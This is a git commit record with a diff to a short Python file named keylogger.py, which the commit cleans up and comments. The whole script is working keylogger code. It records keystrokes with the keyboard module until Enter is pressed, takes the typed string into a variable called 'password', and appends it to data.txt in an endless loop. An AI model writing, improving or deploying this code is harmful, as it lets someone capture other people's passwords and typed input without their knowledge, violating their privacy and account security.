808fa9f36a9f58343905905cf5db6bf0217a1dc7
Jumanji176 <80910392+Jumanji176@users.noreply.github.com>
2021-07-19 13:44:46 +0300

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,10 +1,16 @@
+# Importing the keyboard module which will acess the inputs from the keyboard
 import keyboard
-path = "Data.txt"
-x = False
-while x == False:
-    Data_file = open(path, 'a')
-    events = keyboard.record('enter')
-    password = list(keyboard.get_typed_strings(events))
-    Data_file.write('\n')
-    Data_file.write(password[0])
-    Data_file.close()
+
+# Defining the text file name and path
+path = "data.txt"
+
+while True:
+    with open(path, 'a') as data_file:
+        
+        # All key presses are recorded as a list into "events" and the record loop stops when the "enter" key is pressed
+        events = keyboard.record('enter')
+        password = list(keyboard.get_typed_strings(events))
+        
+        data_file.write('\n') # New line written before data is written
+        data_file.write(password[0])
+        data_file.close()
